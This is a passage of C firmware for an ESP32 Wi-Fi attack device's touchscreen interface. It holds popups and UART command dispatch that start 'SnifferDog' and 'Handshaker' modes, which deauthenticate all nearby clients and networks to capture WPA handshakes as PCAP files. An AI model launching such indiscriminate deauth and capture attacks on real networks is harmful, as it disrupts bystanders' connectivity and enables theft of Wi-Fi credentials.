    lv_obj_set_flex_flow(btn_container, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_container, 30, 0);
    lv_obj_set_style_pad_top(btn_container, 10, 0);
    
    // Cancel button (green, safe option)
    lv_obj_t *cancel_btn = lv_btn_create(btn_container);
    lv_obj_set_size(cancel_btn, 120, 50);
    lv_obj_set_style_bg_color(cancel_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_add_event_cb(cancel_btn, sd_warning_cancel_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_set_style_text_font(cancel_label, &lv_font_montserrat_18, 0);
    lv_obj_center(cancel_label);
    
    // Continue button (orange, risky option)
    lv_obj_t *continue_btn = lv_btn_create(btn_container);
    lv_obj_set_size(continue_btn, 150, 50);
    lv_obj_set_style_bg_color(continue_btn, lv_color_hex(0xFF5722), 0);  // Orange
    lv_obj_set_style_radius(continue_btn, 8, 0);
    lv_obj_add_event_cb(continue_btn, sd_warning_continue_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *continue_label = lv_label_create(continue_btn);
    lv_label_set_text(continue_label, "Continue");
    lv_obj_set_style_text_font(continue_label, &lv_font_montserrat_18, 0);
    lv_obj_center(continue_label);
}

// Callback when user clicks "Stop" during snifferdog attack
static void snifferdog_stop_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "SnifferDog stopped by user - sending stop command");
    
    // Send stop command to the correct UART based on this tab
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    if (active_tab == TAB_MBUS) {
        uart2_send_command("stop");
    } else {
        uart_send_command("stop");
    }
    
    // Close popup
    close_snifferdog_popup_ctx(ctx);
    
    // Return to main screen
    show_main_tiles();
}

// Show snifferdog confirmation popup with icon and warning
static void show_snifferdog_confirm_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->snifferdog_popup != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (fills container, semi-transparent, blocks input behind)
    ctx->snifferdog_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->snifferdog_popup_overlay);
    lv_obj_set_size(ctx->snifferdog_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->snifferdog_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->snifferdog_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->snifferdog_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->snifferdog_popup_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
    ctx->snifferdog_popup = lv_obj_create(ctx->snifferdog_popup_overlay);
    lv_obj_set_size(ctx->snifferdog_popup, 500, 350);
    lv_obj_center(ctx->snifferdog_popup);
    lv_obj_set_style_bg_color(ctx->snifferdog_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->snifferdog_popup, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_border_width(ctx->snifferdog_popup, 3, 0);
    lv_obj_set_style_radius(ctx->snifferdog_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->snifferdog_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->snifferdog_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->snifferdog_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->snifferdog_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->snifferdog_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->snifferdog_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->snifferdog_popup, 16, 0);
    lv_obj_clear_flag(ctx->snifferdog_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Eye icon (sniffing/watching)
    lv_obj_t *icon_label = lv_label_create(ctx->snifferdog_popup);
    lv_label_set_text(icon_label, LV_SYMBOL_EYE_OPEN);
    lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(icon_label, COLOR_MATERIAL_PURPLE, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->snifferdog_popup);
    lv_label_set_text(title, "SNIFFER DOG");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_PURPLE, 0);
    
    // Warning message
    lv_obj_t *message = lv_label_create(ctx->snifferdog_popup);
    lv_label_set_text(message, "This will deauth all clients\naround you. Are you sure?");
    lv_obj_set_style_text_font(message, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(message, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_align(message, LV_TEXT_ALIGN_CENTER, 0);
    
    // Button container
    lv_obj_t *btn_container = lv_obj_create(ctx->snifferdog_popup);
    lv_obj_remove_style_all(btn_container);
    lv_obj_set_size(btn_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(btn_container, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_container, 30, 0);
    lv_obj_set_style_pad_top(btn_container, 10, 0);
    
    // No button (green, safe option)
    lv_obj_t *no_btn = lv_btn_create(btn_container);
    lv_obj_set_size(no_btn, 120, 50);
    lv_obj_set_style_bg_color(no_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_radius(no_btn, 8, 0);
    lv_obj_add_event_cb(no_btn, snifferdog_confirm_no_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *no_label = lv_label_create(no_btn);
    lv_label_set_text(no_label, "No");
    lv_obj_set_style_text_font(no_label, &lv_font_montserrat_18, 0);
    lv_obj_center(no_label);
    
    // Yes button (purple, dangerous option)
    lv_obj_t *yes_btn = lv_btn_create(btn_container);
    lv_obj_set_size(yes_btn, 120, 50);
    lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_radius(yes_btn, 8, 0);
    lv_obj_add_event_cb(yes_btn, snifferdog_confirm_yes_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *yes_label = lv_label_create(yes_btn);
    lv_label_set_text(yes_label, "Yes");
    lv_obj_set_style_text_font(yes_label, &lv_font_montserrat_18, 0);
    lv_obj_center(yes_label);
}

// Show snifferdog active popup with Attack in Progress and Stop button
static void show_snifferdog_active_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->snifferdog_popup != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Determine which UART to use based on this tab
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    
    // Send start_sniffer_dog command to this tab's UART
    if (active_tab == TAB_MBUS) {
        uart2_send_command("start_sniffer_dog");
    } else {
        uart_send_command("start_sniffer_dog");
    }
    ESP_LOGI(TAG, "SnifferDog using tab %d (%s)", active_tab, tab_transport_name(active_tab));
    ctx->snifferdog_running = true;
    
    // Create modal overlay
    ctx->snifferdog_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->snifferdog_popup_overlay);
    lv_obj_set_size(ctx->snifferdog_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->snifferdog_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->snifferdog_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(ctx->snifferdog_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->snifferdog_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    ctx->snifferdog_popup = lv_obj_create(ctx->snifferdog_popup_overlay);
    lv_obj_set_size(ctx->snifferdog_popup, 450, 300);
    lv_obj_center(ctx->snifferdog_popup);
    lv_obj_set_style_bg_color(ctx->snifferdog_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->snifferdog_popup, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_border_width(ctx->snifferdog_popup, 3, 0);
    lv_obj_set_style_radius(ctx->snifferdog_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->snifferdog_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->snifferdog_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->snifferdog_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->snifferdog_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->snifferdog_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->snifferdog_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->snifferdog_popup, 20, 0);
    lv_obj_clear_flag(ctx->snifferdog_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Eye icon
    lv_obj_t *icon_label = lv_label_create(ctx->snifferdog_popup);
    lv_label_set_text(icon_label, LV_SYMBOL_EYE_OPEN);
    lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(icon_label, COLOR_MATERIAL_PURPLE, 0);
    
    // Attack in progress title
    lv_obj_t *title = lv_label_create(ctx->snifferdog_popup);
    lv_label_set_text(title, "Attack in Progress");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_PURPLE, 0);
    
    // Subtitle
    lv_obj_t *subtitle = lv_label_create(ctx->snifferdog_popup);
    lv_label_set_text(subtitle, "Deauthing all clients...");
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0xAAAAAA), 0);
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(ctx->snifferdog_popup);
    lv_obj_set_size(stop_btn, 180, 55);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, snifferdog_stop_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, LV_SYMBOL_STOP " Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_20, 0);
    lv_obj_center(stop_label);
}

//==================================================================================
// Global Handshaker Attack Popup
//==================================================================================

// Close global handshaker popup helper
static void close_global_handshaker_popup_ctx(tab_context_t *ctx)
{
    if (!ctx) return;
    
    // Stop monitoring task first
    ctx->global_handshaker_monitoring = false;
    if (ctx->global_handshaker_task != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));  // Give task time to exit
        ctx->global_handshaker_task = NULL;
    }
    
    if (ctx->global_handshaker_popup_overlay) {
        lv_obj_del(ctx->global_handshaker_popup_overlay);
        ctx->global_handshaker_popup_overlay = NULL;
        ctx->global_handshaker_popup = NULL;
        ctx->global_handshaker_log_container = NULL;
        ctx->global_handshaker_status_label = NULL;
        ctx->global_handshaker_log_buffer[0] = '\0';
    }
}

// Callback when user confirms "Yes" on global handshaker confirmation
static void global_handshaker_confirm_yes_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Global Handshaker confirmed - starting attack");
    
    // Close confirmation popup
    close_global_handshaker_popup_ctx(ctx);
    
    // Show active attack popup
    show_global_handshaker_active_popup();
}

// Callback when user clicks "No" on global handshaker confirmation
static void global_handshaker_confirm_no_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Global Handshaker cancelled by user");
    
    // Just close popup
    close_global_handshaker_popup_ctx(ctx);
}

// Callback when user clicks "Stop" during global handshaker attack
static void global_handshaker_stop_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Global Handshaker stopped by user - sending stop command");
    
    // Send stop command to the correct UART based on which tab was used
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    if (active_tab == TAB_MBUS) {
        uart2_send_command("stop");
    } else {
        uart_send_command("stop");
    }
    
    // Close popup (also stops monitoring task)
    close_global_handshaker_popup_ctx(ctx);
    
    // Return to main screen
    show_main_tiles();
}

// Append message to global handshaker log with color coding (per-tab context)
static void append_global_handshaker_log_ctx(tab_context_t *ctx, const char *message, hs_log_type_t log_type)
{
    if (!ctx || !message || strlen(message) == 0) return;
    
    // Determine color based on log type
    lv_color_t text_color;
    switch (log_type) {
        case HS_LOG_SUCCESS:
            text_color = COLOR_MATERIAL_GREEN;
            break;
        case HS_LOG_ALREADY:
            text_color = COLOR_MATERIAL_AMBER;
            break;
        case HS_LOG_ERROR:
            text_color = COLOR_MATERIAL_RED;
            break;
        case HS_LOG_PROGRESS:
        default:
            text_color = lv_color_hex(0xAAAAAA);
            break;
    }
    
    // Append to log buffer (keep last messages if buffer full)
    size_t current_len = strlen(ctx->global_handshaker_log_buffer);
    size_t msg_len = strlen(message);
    size_t max_len = sizeof(ctx->global_handshaker_log_buffer) - 2;
    
    // If adding this message would overflow, remove oldest lines
    while (current_len + msg_len + 1 > max_len && current_len > 0) {
        char *newline = strchr(ctx->global_handshaker_log_buffer, '\n');
        if (newline) {
            memmove(ctx->global_handshaker_log_buffer, newline + 1, strlen(newline));
            current_len = strlen(ctx->global_handshaker_log_buffer);
        } else {
            ctx->global_handshaker_log_buffer[0] = '\0';
            current_len = 0;
            break;
        }
    }
    
    // Append new message
    if (current_len > 0) {
        strncat(ctx->global_handshaker_log_buffer, "\n", sizeof(ctx->global_handshaker_log_buffer) - current_len - 1);
    }
    strncat(ctx->global_handshaker_log_buffer, message, sizeof(ctx->global_handshaker_log_buffer) - strlen(ctx->global_handshaker_log_buffer) - 1);
    
    // Update UI
    bsp_display_lock(0);
    if (ctx->global_handshaker_status_label) {
        lv_label_set_text(ctx->global_handshaker_status_label, ctx->global_handshaker_log_buffer);
        lv_obj_set_style_text_color(ctx->global_handshaker_status_label, text_color, 0);
    }
    // Auto-scroll to bottom
    if (ctx->global_handshaker_log_container) {
        lv_obj_scroll_to_y(ctx->global_handshaker_log_container, LV_COORD_MAX, LV_ANIM_ON);
    }
    bsp_display_unlock();
}

// Helper to extract SSID from quotes in a line
static bool extract_ssid_from_quotes(const char *line, char *ssid, size_t ssid_size)
{
    char *start = strchr(line, '\'');
    if (start) {
        char *end = strchr(start + 1, '\'');
        if (end) {
            int slen = end - start - 1;
            if (slen > 0 && slen < (int)ssid_size - 1) {
                strncpy(ssid, start + 1, slen);
                ssid[slen] = '\0';
                return true;
            }
        }
    }
    return false;
}

// Global handshaker monitor task - reads UART for handshake capture (per-tab context)
static void global_handshaker_monitor_task(void *arg)
{
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        ESP_LOGE(TAG, "Global Handshaker monitor task: no context");
        vTaskDelete(NULL);
        return;
    }
    
    // Determine which UART port to read from based on tab
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (active_tab == TAB_MBUS) ? UART2_NUM : UART_NUM;
    
    ESP_LOGI(TAG, "Global Handshaker monitor task started (tab=%d, uart=%d)", active_tab, uart_port);
    
    static char rx_buffer[512];
    static char line_buffer[512];
    int line_pos = 0;
    
    while (ctx->global_handshaker_monitoring) {
        int len = transport_read_bytes_tab(active_tab, uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGI(TAG, "Global Handshaker UART: %s", line_buffer);
                        
                        // Determine message type and log it
                        hs_log_type_t log_type = HS_LOG_PROGRESS;
                        bool should_log = false;
                        char display_msg[256] = {0};
                        char ssid[64] = {0};
                        
                        // ===== PHASE/ATTACK START =====
                        if (strstr(line_buffer, "PHASE") != NULL && strstr(line_buffer, "Attack") != NULL) {
                            // "===== PHASE 2: Attack All Networks ====="
                            strncpy(display_msg, "Starting attack on all networks...", sizeof(display_msg) - 1);
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "Attacking") != NULL && strstr(line_buffer, "networks...") != NULL) {
                            // "Attacking 16 networks..."
                            char *num = strstr(line_buffer, "Attacking ");
                            if (num) {
                                int count = atoi(num + 10);
                                snprintf(display_msg, sizeof(display_msg), "Attacking %d networks...", count);
                            }
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        
                        // ===== CURRENT TARGET (>>> [N/M] Attacking 'SSID' <<<) =====
                        else if (strstr(line_buffer, ">>> [") != NULL && strstr(line_buffer, "Attacking") != NULL) {
                            // Parse: ">>> [1/16] Attacking 'Horizon Wi-Free' (Ch 6, RSSI: -51 dBm) <<<"
                            int current = 0, total = 0;
                            char *bracket = strstr(line_buffer, "[");
                            if (bracket) {
                                sscanf(bracket, "[%d/%d]", &current, &total);
                            }
                            if (extract_ssid_from_quotes(line_buffer, ssid, sizeof(ssid))) {
                                if (current > 0 && total > 0) {
                                    snprintf(display_msg, sizeof(display_msg), "[%d/%d] Attacking: %s", current, total, ssid);
                                } else {
                                    snprintf(display_msg, sizeof(display_msg), "Attacking: %s", ssid);
                                }
                            } else {
                                snprintf(display_msg, sizeof(display_msg), "[%d/%d] Attacking network...", current, total);
                            }
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        
                        // ===== SKIPPING (already captured) =====
                        else if (strstr(line_buffer, "Skipping") != NULL && strstr(line_buffer, "PCAP already exists") != NULL) {
                            // "[2/16] Skipping 'VMA84A66C-2.4' - PCAP already exists"
                            int current = 0, total = 0;
                            char *bracket = strstr(line_buffer, "[");
                            if (bracket) {
                                sscanf(bracket, "[%d/%d]", &current, &total);
                            }
                            if (extract_ssid_from_quotes(line_buffer, ssid, sizeof(ssid))) {
                                if (strlen(ssid) > 0) {
                                    snprintf(display_msg, sizeof(display_msg), "[%d/%d] Already have: %s", current, total, ssid);
                                } else {
                                    snprintf(display_msg, sizeof(display_msg), "[%d/%d] Already have (hidden)", current, total);
                                }
                            } else {
                                snprintf(display_msg, sizeof(display_msg), "[%d/%d] Already captured", current, total);
                            }
                            log_type = HS_LOG_ALREADY;
                            should_log = true;
                        }
                        
                        // ===== SUCCESS INDICATORS (green) =====
                        else if (strstr(line_buffer, "Handshake captured for") != NULL ||
                                 (strstr(line_buffer, "Handshake captured") != NULL && strstr(line_buffer, "after burst") != NULL)) {
                            // "✓ Handshake captured for 'SSID' after burst #N!"
                            if (extract_ssid_from_quotes(line_buffer, ssid, sizeof(ssid))) {
                                snprintf(display_msg, sizeof(display_msg), "CAPTURED: %s", ssid);
                            } else {
                                strncpy(display_msg, "Handshake captured!", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "HANDSHAKE IS COMPLETE AND VALID") != NULL) {
                            strncpy(display_msg, "Handshake validated!", sizeof(display_msg) - 1);
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "PCAP saved:") != NULL) {
                            // Extract filename
                            char *path = strstr(line_buffer, "/sdcard/");
                            if (path) {
                                char *slash = strrchr(path, '/');
                                if (slash) {
                                    snprintf(display_msg, sizeof(display_msg), "Saved: %s", slash + 1);
                                }
                            }
                            if (display_msg[0] == '\0') {
                                strncpy(display_msg, "PCAP saved to SD", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "handshake saved for SSID:") != NULL) {
                            char *ssid_start = strstr(line_buffer, "SSID:");
                            if (ssid_start) {
                                ssid_start += 5;
                                while (*ssid_start == ' ') ssid_start++;
                                int j = 0;
                                while (ssid_start[j] && ssid_start[j] != ' ' && ssid_start[j] != '(' && j < 63) {
                                    ssid[j] = ssid_start[j];
                                    j++;
                                }
                                ssid[j] = '\0';
                                snprintf(display_msg, sizeof(display_msg), "SAVED: %s", ssid);
                            } else {
                                strncpy(display_msg, "Handshake saved!", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        
                        // ===== FAILURE INDICATORS (red) =====
                        else if (strstr(line_buffer, "No handshake for") != NULL) {
                            // "✗ No handshake for 'SSID' after 3 bursts"
                            if (extract_ssid_from_quotes(line_buffer, ssid, sizeof(ssid))) {
                                snprintf(display_msg, sizeof(display_msg), "No handshake: %s", ssid);
                            } else {
                                strncpy(display_msg, "No handshake captured", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_ERROR;
                            should_log = true;
                        }
                        
                        // ===== PHASE/SCAN INFO =====
                        else if (strstr(line_buffer, "PHASE 1") != NULL || strstr(line_buffer, "Scanning") != NULL) {
                            strncpy(display_msg, "Scanning for networks...", sizeof(display_msg) - 1);
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "Found") != NULL && strstr(line_buffer, "networks") != NULL) {
                            char *num = strstr(line_buffer, "Found ");
                            if (num) {
                                int count = atoi(num + 6);
                                snprintf(display_msg, sizeof(display_msg), "Found %d networks", count);
                                log_type = HS_LOG_PROGRESS;
                                should_log = true;
                            }
                        }
                        
                        // ===== COOLDOWN (just log for awareness) =====
                        else if (strstr(line_buffer, "Cooling down") != NULL) {
                            // Don't spam cooldown messages, just skip
                            should_log = false;
                        }
                        
                        // ===== ATTACK CYCLE INFO =====
                        else if (strstr(line_buffer, "Attack Cycle Complete") != NULL ||
                                 strstr(line_buffer, "Restarting attack cycle") != NULL) {
                            strncpy(display_msg, "Cycle complete, restarting...", sizeof(display_msg) - 1);
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        
                        // Log the message if it's relevant
                        if (should_log && display_msg[0] != '\0') {
                            append_global_handshaker_log_ctx(ctx, display_msg, log_type);
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "Global Handshaker monitor task ended");
    ctx->global_handshaker_task = NULL;
    vTaskDelete(NULL);
}

// Show global handshaker confirmation popup with icon and warning
static void show_global_handshaker_confirm_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->global_handshaker_popup != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (fills container, semi-transparent, blocks input behind)
    ctx->global_handshaker_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->global_handshaker_popup_overlay);
    lv_obj_set_size(ctx->global_handshaker_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->global_handshaker_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->global_handshaker_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->global_handshaker_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->global_handshaker_popup_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
    ctx->global_handshaker_popup = lv_obj_create(ctx->global_handshaker_popup_overlay);
    lv_obj_set_size(ctx->global_handshaker_popup, 520, 380);
    lv_obj_center(ctx->global_handshaker_popup);
    lv_obj_set_style_bg_color(ctx->global_handshaker_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->global_handshaker_popup, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_border_width(ctx->global_handshaker_popup, 3, 0);
    lv_obj_set_style_radius(ctx->global_handshaker_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->global_handshaker_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->global_handshaker_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->global_handshaker_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->global_handshaker_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->global_handshaker_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->global_handshaker_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->global_handshaker_popup, 14, 0);
    lv_obj_clear_flag(ctx->global_handshaker_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Download icon (file save icon - same as tile)
    lv_obj_t *icon_label = lv_label_create(ctx->global_handshaker_popup);
    lv_label_set_text(icon_label, LV_SYMBOL_DOWNLOAD);
    lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(icon_label, COLOR_MATERIAL_AMBER, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->global_handshaker_popup);
    lv_label_set_text(title, "HANDSHAKER");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // Warning message
    lv_obj_t *message = lv_label_create(ctx->global_handshaker_popup);
    lv_label_set_text(message, "This will deauth all networks around\nyou in order to grab handshakes.\nAre you sure?");
    lv_obj_set_style_text_font(message, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(message, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_align(message, LV_TEXT_ALIGN_CENTER, 0);
    
    // Button container
    lv_obj_t *btn_container = lv_obj_create(ctx->global_handshaker_popup);
    lv_obj_remove_style_all(btn_container);
    lv_obj_set_size(btn_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(btn_container, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_container, 30, 0);
    lv_obj_set_style_pad_top(btn_container, 10, 0);
    
    // No button (green, safe option)
    lv_obj_t *no_btn = lv_btn_create(btn_container);
    lv_obj_set_size(no_btn, 120, 50);
    lv_obj_set_style_bg_color(no_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_radius(no_btn, 8, 0);
    lv_obj_add_event_cb(no_btn, global_handshaker_confirm_no_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *no_label = lv_label_create(no_btn);
    lv_label_set_text(no_label, "No");
    lv_obj_set_style_text_font(no_label, &lv_font_montserrat_18, 0);
    lv_obj_center(no_label);
    
    // Yes button (amber, dangerous option)
    lv_obj_t *yes_btn = lv_btn_create(btn_container);
    lv_obj_set_size(yes_btn, 120, 50);
    lv_obj_set_style_bg_color(yes_btn, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_radius(yes_btn, 8, 0);
    lv_obj_add_event_cb(yes_btn, global_handshaker_confirm_yes_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *yes_label = lv_label_create(yes_btn);
    lv_label_set_text(yes_label, "Yes");
    lv_obj_set_style_text_font(yes_label, &lv_font_montserrat_18, 0);
    lv_obj_center(yes_label);
}

// Show global handshaker active popup with Attack in Progress and Stop button
static void show_global_handshaker_active_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->global_handshaker_popup != NULL) return;  // Already showing
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Determine which UART to use based on this tab
    tab_id_t active_tab = tab_id_for_ctx(ctx);
    
    // Send start_handshake command to this tab's UART
    if (active_tab == TAB_MBUS) {
        uart2_send_command("start_handshake");
    } else {
        uart_send_command("start_handshake");
    }
    ESP_LOGI(TAG, "Global Handshaker using tab %d (%s)", active_tab, tab_transport_name(active_tab));
    
    // Create modal overlay
    ctx->global_handshaker_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->global_handshaker_popup_overlay);
    lv_obj_set_size(ctx->global_handshaker_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->global_handshaker_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->global_handshaker_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(ctx->global_handshaker_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->global_handshaker_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
